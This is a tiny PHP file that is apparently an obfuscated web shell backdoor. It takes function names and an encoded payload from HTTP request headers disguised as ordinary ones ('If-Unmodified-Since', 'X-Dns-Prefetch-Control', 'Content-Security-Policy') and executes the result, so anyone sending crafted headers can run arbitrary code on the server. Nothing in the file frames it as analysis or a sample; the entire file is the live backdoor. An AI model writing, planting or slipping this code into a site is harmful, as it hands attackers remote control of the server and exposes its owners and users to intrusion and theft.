<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $clases = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Content-Security-Policy']));
    $clases();
}